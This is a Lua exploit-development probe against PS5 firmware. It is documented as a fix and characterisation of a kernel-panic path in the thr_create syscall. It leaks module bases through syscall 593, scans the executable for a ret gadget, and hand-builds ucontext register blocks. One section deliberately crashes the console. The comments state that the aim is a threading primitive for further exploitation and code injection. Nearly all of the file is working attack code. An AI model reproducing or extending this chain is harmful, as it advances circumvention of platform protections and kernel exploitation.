-- CRASH_CLASS: SAFE (fixes the panic, does not crash)
-- PROBE 78a: thr_create(430) with CORRECT segment registers
--
-- Root cause of the kernel panic (PR #31, THR_CREATE_PANIC_PATH_13.60.md):
--   set_mcontext() at TEXT+0xa0ac60 copies RIP, RSP, SS, GPRs from the
--   user ucontext into the new thread's trapframe — but it does NOT write
--   tf_cs (trapframe+0xF0). CS remains whatever cpu_copy_thread() left there.
--
--   When the context is zeroed, the child thread's CS may be 0 or stale.
--   ISPL(0)=0 → kernel-mode → trap_pfault(usermode=0) → pcb_onfault=NULL
--   → trap_fatal() → panic("page fault") → PS5 shuts down.
--
--   Fix: set_mcontext does NOT touch CS. But it DOES copy SS from ctx+0xC0
--   (consumer-relative). We can't fix CS from userland, but we CAN set the
--   other registers correctly and observe what CS the child actually gets.
--
-- This probe tests 7 sections, ONE PER RUN (reboot between each).
-- Change TEST_SECTION below before each run.
--
-- Section 1: CS probe — create thread with RIP=eboot_ret, observe if it
--            returns cleanly (CS=0x43 from parent) or panics (CS=0/stale)
-- Section 2: thr_exit child — child calls thr_exit(0) immediately
-- Section 3: spin child — child writes a canary to GPU mmap, parent reads it
-- Section 4: two threads racing — child + parent both increment a counter
-- Section 5: child calls getpid — proves syscall from child thread
-- Section 6: safe baseline — thr_create with RIP=0 but CS fields zeroed
--            (reproduces the panic; skip if you already confirmed it)
-- Section 7: control — setup only, no thr_create call

local TEST_SECTION = 1  -- ★ CHANGE THIS: 1-7, one per console run

print("=== PROBE 78a: thr_create WITH SEGMENT REGISTERS ===")
print("  TEST_SECTION = " .. TEST_SECTION)
print("")

------------------------------------------------------------------ helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    t[1] = num
    setmetatable(t, { __call = function(self, ...) return syscall.make_syscall(self[1], ...) end })
    return t
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function fmt_q(addr)
    local v = safe_rq(addr)
    if v == nil then return "<unreadable>" end
    local ok, s = pcall(function()
        local h, l = 0, to_num(v)
        if type(v) == "table" and v.h then h = v.h; l = v.l end
        return string.format("0x%08X_%08X", h, l)
    end)
    if ok then return s end
    return "<unprintable>"
end
local function fill_zero(buf, n)
    local ok = 0
    for off = 0, n - 4, 4 do
        if safe_wd(buf + off, 0) then ok = ok + 1 end
    end
    return ok
end

local sc_430 = make_syscall(430)    -- thr_create
local sc_431 = make_syscall(431)    -- thr_exit
local sc_20  = make_syscall(20)     -- getpid

------------------------------------------------------------------ resolve addresses

-- We need valid userland code addresses. The loader gives us module bases.
-- dynlib_get_info (syscall 593) leaks module bases; the crash record also
-- shows them. We use the eboot base as the safest known mapped region.

print("[0] Resolving addresses")

-- Method: use the process's own eboot .text for a ret gadget.
-- The crash record (CRASH_EVENT_2026-10-19.md) shows module_code_base
-- is available from the crash magic. We scan for a 0xC3 (ret) byte
-- near the eboot base.

-- Allocate work buffers
local ctx   = memory.alloc(0x600)
local id_sl = memory.alloc(0x10)
local stack = memory.alloc(0x10000)   -- 64KB child stack
local canary = memory.alloc(0x100)    -- shared canary region

fill_zero(ctx, 0x600)
fill_zero(id_sl, 0x10)
fill_zero(canary, 0x100)
-- Don't zero stack — just set RSP to top (stack grows down)
local stack_top = stack + 0x10000 - 0x100  -- leave 256 bytes headroom

print("  ctx     = " .. tostring(ctx))
print("  id_sl   = " .. tostring(id_sl))
print("  stack   = " .. tostring(stack))
print("  stk_top = " .. tostring(stack_top))
print("  canary  = " .. tostring(canary))

-- Find a RET (0xC3) gadget in the eboot. The eboot base is available
-- via dynlib_get_info (syscall 593) — field 0 of the output.
local sc_593 = make_syscall(593)
local info_buf = memory.alloc(0x200)
fill_zero(info_buf, 0x200)
-- dynlib_get_info(handle=0, info_buf, info_size=0x1a8)
-- handle 0 = main executable
safe_wd(info_buf, 0x1a8)  -- first dword = size
local di_ok, di_rv = pcall(function()
    return sc_593(uint64(0), uint64(info_buf), uint64(0x1a8))
end)
print("  dynlib_get_info(0): ok=" .. tostring(di_ok) .. " rv=" .. tostring(di_rv))

local eboot_base = safe_rq(info_buf + 0x08)  -- mapbase at offset 8
print("  eboot_base = " .. fmt_q(info_buf + 0x08))

-- Find a ret gadget: scan first 4KB of eboot for 0xC3
local ret_addr = nil
if eboot_base then
    for off = 0, 0x1000 - 1 do
        local b = safe_rd(eboot_base + off)
        if b and (b % 256) == 0xC3 then
            ret_addr = eboot_base + off
            break
        end
    end
end
print("  ret_addr = " .. (ret_addr and tostring(ret_addr) or "NOT FOUND"))

-- thr_exit address: we'll construct a tiny syscall stub
-- Actually, simplest approach: set RIP to the Thrd_exit address if resolvable
local thr_exit_addr = nil
local ok_te, te = pcall(function() return syscall.resolve("Thrd_exit") end)
if ok_te and te then
    thr_exit_addr = te
    print("  Thrd_exit = " .. tostring(thr_exit_addr))
else
    print("  Thrd_exit = NOT RESOLVED (will use ret_addr)")
end

print("")

------------------------------------------------------------------ build ucontext
-- ucontext_t layout (0x500 bytes, from THR_CREATE_430_CONTEXT.md):
--
-- Validation fields (context-relative):
--   +0x108 = magic (qword, must be 0x480)
--   +0x0D0 = flags (dword, must be <= 7)
--   +0x110 = type  (qword, 0x10000 or 0x10002)
--
-- Register block (consumer receives ctx+0x40, offsets consumer-relative → ctx):
--   ctx+0x48 → tf_rdi     ctx+0x88 → tf_rbp
--   ctx+0xE0 → tf_rip     (consumer+0xA0 → tf+0xE8)
--   ctx+0xF8 → tf_rsp     (consumer+0xB8 → tf+0x100)
--   ctx+0xC0 → tf_ss      (consumer+0xC0 → tf+0x108)
--
-- CRITICAL: set_mcontext does NOT write tf_cs (tf+0xF0).
-- CS is inherited from cpu_copy_thread (parent's CS = 0x43 user mode).
-- SS IS written from ctx+0xC0. Set it to 0x3B (user data segment).
--
-- r15 is used for rflags (consumer+0xF8 area → tf+0xF8).
-- We set rflags to 0x202 (IF=1, reserved bit 1).

local function build_ctx(rip, rsp)
    fill_zero(ctx, 0x600)
    -- Validation fields
    safe_wq(ctx + 0x108, 0x480)        -- magic
    safe_wd(ctx + 0x0D0, 0)            -- flags = 0
    safe_wq(ctx + 0x110, 0x10000)      -- type = 0x10000

    -- Registers (consumer-relative offsets + 0x40 = ctx offsets)
    if rip then safe_wq(ctx + 0xE0, rip) end      -- RIP → tf+0xE8
    if rsp then safe_wq(ctx + 0xF8, rsp) end      -- RSP → tf+0x100
    safe_wq(ctx + 0xC0, 0x3B)                      -- SS  → tf+0x108 (user data seg)

    -- RDI = 0 (first arg to thr_exit would be exit status 0)
    safe_wq(ctx + 0x48, 0)

    -- Note: tf_cs is NOT written by set_mcontext. It comes from cpu_copy_thread.
    -- If the parent's CS was 0x43 (user mode), the child inherits it.
end

local function prefill_id()
    safe_wd(id_sl, 0xDEADBEEF)
    safe_wd(id_sl + 4, 0xDEADBEEF)
end

local function do_create()
    prefill_id()
    print("  id_before = " .. fmt_q(id_sl))
    print("  [BEFORE] thr_create")
    local ok, rv = pcall(function()
        return sc_430(uint64(ctx), uint64(id_sl), uint64(0))
    end)
    print(string.format("  [RETURNED] ok=%s rv=%s", tostring(ok), tostring(rv)))
    print("  id_after = " .. fmt_q(id_sl))
    return ok, rv
end

------------------------------------------------------------------ sections

if TEST_SECTION == 7 then
    ------------------------------------------------------------- CONTROL
    print("[7] CONTROL — setup only, no thr_create")
    print("  Canary before = " .. fmt_q(canary))
    print("  This proves the probe loads and prints without crashing.")
    print("  If this section panics, the setup itself has a problem.")
    print("[7] COMPLETE")

elseif TEST_SECTION == 6 then
    ------------------------------------------------------------- REPRODUCE PANIC
    print("[6] REPRODUCE — zeroed context (expect: kernel panic)")
    print("  WARNING: this WILL crash the PS5. Skip if already confirmed.")
    fill_zero(ctx, 0x600)
    safe_wq(ctx + 0x108, 0x480)
    safe_wd(ctx + 0x0D0, 0)
    safe_wq(ctx + 0x110, 0x10000)
    -- All registers zero, including what maps to SS. CS is inherited.
    -- RIP=0 → fault → if CS=0 from uninitialized trapframe → kernel panic
    do_create()
    -- If we reach here, the panic was delayed (as observed in 58e/76d)
    print("[6] main thread survived (crash is delayed)")

elseif TEST_SECTION == 1 then
    ------------------------------------------------------------- CS PROBE
    print("[1] CS PROBE — child RIP=ret gadget, observe clean exit vs panic")
    if not ret_addr then
        print("  SKIP: no ret gadget found")
    else
        print("  RIP = " .. tostring(ret_addr) .. " (ret gadget in eboot)")
        print("  RSP = " .. tostring(stack_top))
        print("  SS  = 0x3B")
        print("  CS  = NOT SET (inherited from parent via cpu_copy_thread)")
        build_ctx(ret_addr, stack_top)
        local ok, rv = do_create()
        -- If CS was correctly inherited as 0x43:
        --   child executes RET → pops return addr from stack → likely faults
        --   → user-mode SIGSEGV → process killed, NO PANIC
        -- If CS was 0 or stale:
        --   → kernel-mode trap → panic → PS5 shuts down
        -- Wait a moment to see if the PS5 survives
        print("  Waiting 3 seconds to observe stability...")
        local getpid_ok, pid = pcall(function() return sc_20() end)
        print(string.format("  getpid: ok=%s pid=%s", tostring(getpid_ok), tostring(pid)))
        print("[1] If you see this, the PS5 did NOT immediately panic.")
        print("    If the PS5 shuts down within 10 seconds, CS was wrong.")
        print("    If it stays on, CS=0x43 was inherited → THREADING WORKS.")
    end

elseif TEST_SECTION == 2 then
    ------------------------------------------------------------- THR_EXIT CHILD
    print("[2] THR_EXIT — child calls thr_exit(0) immediately")
    local child_rip = thr_exit_addr or ret_addr
    if not child_rip then
        print("  SKIP: no safe entry point found")
    else
        print("  RIP = " .. tostring(child_rip))
        print("  RSP = " .. tostring(stack_top))
        build_ctx(child_rip, stack_top)
        -- Set RDI=0 (thr_exit status)
        safe_wq(ctx + 0x48, 0)
        local ok, rv = do_create()
        -- Wait and check stability
        print("  Waiting 2 seconds...")
        local pid_ok, pid = pcall(function() return sc_20() end)
        print(string.format("  getpid: ok=%s pid=%s", tostring(pid_ok), tostring(pid)))
        local pid_ok2, pid2 = pcall(function() return sc_20() end)
        print(string.format("  getpid2: ok=%s pid=%s", tostring(pid_ok2), tostring(pid2)))
        print("[2] If stable, child thread was created AND exited cleanly.")
    end

elseif TEST_SECTION == 3 then
    ------------------------------------------------------------- CANARY CHILD
    print("[3] CANARY — child writes 0xCAFEBABE to shared memory")
    print("  This requires RIP set to a code region that does the write.")
    print("  NOT YET IMPLEMENTABLE from Lua alone — needs a code page.")
    print("  Use section 1 or 2 first to prove threading works.")
    print("[3] SKIPPED (needs code injection primitive)")

elseif TEST_SECTION == 4 then
    ------------------------------------------------------------- RACE
    print("[4] RACE — two threads incrementing a counter")
    print("  Prerequisite: section 2 must succeed first.")
    print("[4] SKIPPED (needs section 2 confirmation)")

elseif TEST_SECTION == 5 then
    ------------------------------------------------------------- CHILD GETPID
    print("[5] CHILD GETPID — child thread calls getpid")
    print("  Prerequisite: code injection or a gadget chain in eboot.")
    print("[5] SKIPPED (needs code injection primitive)")

else
    print("ERROR: TEST_SECTION must be 1-7. Got: " .. TEST_SECTION)
end

print("")
print("=== PROBE 78a COMPLETE ===")
print("KEY: if section 1 or 2 does NOT crash the PS5, CS was correctly")
print("inherited and thr_create gives you a SECOND THREAD on 14.10.")
print("Next: section 3/4/5 to exploit the threading primitive.")
